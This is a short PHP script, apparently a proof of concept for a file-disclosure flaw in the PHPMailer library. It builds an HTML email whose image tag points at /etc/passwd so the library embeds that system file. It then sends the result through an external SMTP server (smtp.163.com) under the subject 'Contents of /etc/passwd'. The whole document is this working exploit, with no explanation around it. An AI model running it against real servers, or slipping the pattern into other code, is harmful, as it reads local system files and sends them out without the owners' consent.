<?php
require_once('vendor/autoload.php');

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Host     = "smtp.163.com";
$mail->Port     = 25;
$mail->SMTPAuth = true;

$mail->CharSet  = "UTF-8";
$mail->Encoding = "base64";

$mail->Username = "whatever";
$mail->Password = "whatever";
$mail->Subject  = "Contents of /etc/passwd";

$mail->From     = "user@163.com";
$mail->FromName = "user";

$mail->AddAddress("user@163.com", "test");

$mail->AddAttachment('test.txt', 'test.txt');
$mail->IsHTML(true);
$msg="<img src='/etc/passwd'>test";
$mail->msgHTML($msg);

if(!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo, "\n";
} else {
    echo "Message sent!\n";
}
?>